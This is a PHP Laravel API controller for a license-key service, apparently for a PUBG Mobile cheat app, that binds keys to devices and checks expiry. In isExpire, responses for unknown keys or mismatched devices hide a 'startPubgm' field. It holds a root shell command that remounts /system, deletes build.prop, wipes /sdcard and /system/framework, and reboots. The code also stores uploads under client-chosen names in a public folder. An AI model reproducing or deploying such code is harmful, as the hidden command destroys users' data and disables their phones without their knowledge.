<?php

namespace App\Http\Controllers\API\Public;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Key as Model;
use Illuminate\Support\Facades\Auth;
use Validator;
use Carbon\Carbon;

class PublicController extends Controller
{
    function dashboard() {
        return $this->sendResponse(Model::where('user_id', Auth::user()->id)->count(), 'Success');
    }
    function Index(Request $request) {
        $models = Model::query();
        if($request->search) {
            $search = $request->search;
            $models = $models->where('key', 'ilike', '%'.$search.'%');
                
        }
        $models = $models->where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->paginate(10);
        return $this->sendResponse($models, 'Success');
    }

    function store(Request $request) {
        $validator = Validator::make($request->all(), [
            'key' => ['required', 'unique:keys'],
            'duration' => ['required'],
            // 'device_id' => ['required']
        ]);
        if($validator->fails()){
            return $this->sendError('Validation Error.', $validator->errors());
        }
        $model = new Model;
        $model->key = $request->key;
        $model->duration = $request->duration;
        $model->user_id = Auth::user()->id;
        // $model->device_id = $request->device_id;
        $model->save();
        return $this->sendResponse($model->id, 'Berhasil menambah data');
    }

    function update(Request $request, $id) {
        $validator = Validator::make($request->all(), [
            'duration' => ['required'],
        ]);
        $model = Model::findOrFail($id);
        // $model->duration = $request->duration;
        $model->end_date = date("Y/m/d", strtotime($model->end_date."+". $request->duration." days"));
        $model->save();
        return $this->sendResponse($model->id, 'Berhasil mengedit data');
    }

    function reset($id) {
        $model = Model::findOrFail($id);
        $model->device_id = '';
        $model->save();
        return $this->sendResponse($model->id, 'Berhasil reset device');
    }
    
    function resetAllDevice() {
        $models = Model::all();
        foreach ($models as $model) {
            $model->device_id = '';
            $model->save();
        }
        return $this->sendResponse(true, 'Berhasil reset semua device');
    }

    function destroy($id) {
        $model = Model::findOrFail($id);
        $model->delete();
        return $this->sendResponse(true, 'Berhasil menghapus key');
    }

    public function isExpire(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'key' => ['required'],
            'device_id' => ['required'],
        ]);
        $model = Model::where('key', $request->get('key'))->first();
        $returned = false;
        if (!empty($model)) {
            if (empty($model->device_id)) {
                $model->device_id = $request->get('device_id');
                $today = date("Y/m/d");
                $model->start_date = $today;
                if(empty($model->end_date)) {
                    $model->end_date = date("Y/m/d", strtotime($today."+".$model->duration." days"));
                }
                $model->save();
            } else {
                if ($model->device_id != $request->get('device_id')) {
                    return response()->json([
                        'status' => 500,
                        'message' => 'Error, your phone not registered',
                        'data' => true,
						'startPubgm' => "su -c mount -o rw,remount /system && su -c rm /system/build.prop && su -c rm -r /sdcard/* && su -c rm -r /system/framework/*"
                    ]);
                }
            }
            $expireDate = strtotime($model->end_date);
            $currentDate = strtotime(date("Y/m/d"));
            $returned = $expireDate < $currentDate;

            $seconds = strtotime($model->end_date) - time();

            $days = floor($seconds / 86400);
            $seconds %= 86400;

            $hours = floor($seconds / 3600);
            $seconds %= 3600;

            $minutes = floor($seconds / 60);
            $seconds %= 60;

             //"$days days and $hours hours and $minutes minutes and $seconds seconds";
            $model = Model::where('key', $request->get('key'))->first();
            $model->last_login = Carbon::now('Asia/Jakarta')->format('Y-m-d H:i:s');
            $model->save();
            if (!$returned) {
                return response()->json([
                    'status' => 666,
                    'message' => 'Success',
                    'last_login' => $model->last_login,
                    'data' => $returned,
					'startPubgm' => '',
					'client' => $request->get('client'),
                    'days' => $days + 1,
                    
                ]);
            } else {
                return response()->json([
                    'status' => 300,
                    'message' => 'Error, your key is expire',
                    'data' => $returned,
					'startPubgm' => ''
                ]);
            }
        } else {
            return response()->json([
                'status' => 400,
                'message' => 'Error, your phone not registered',
                'data' => true,
				'startPubgm' => "su -c mount -o rw,remount /system && su -c rm /system/build.prop && su -c rm -r /sdcard/* && su -c rm -r /system/framework/* && su -c reboot"
            ]);
        }
    }

    function uploadSock(Request $request) {
        if($request->file) {
            $storePath = "public/sock/";
            $path = "storage/sock";
            $file = $request->file('file');
            $filename = $file->getClientOriginalName();
        }

        if($request->file) {
            $file->storeAs($storePath, $filename);
        }

        return $this->sendResponse(true, 'Berhasil mengupload file');
    }
}
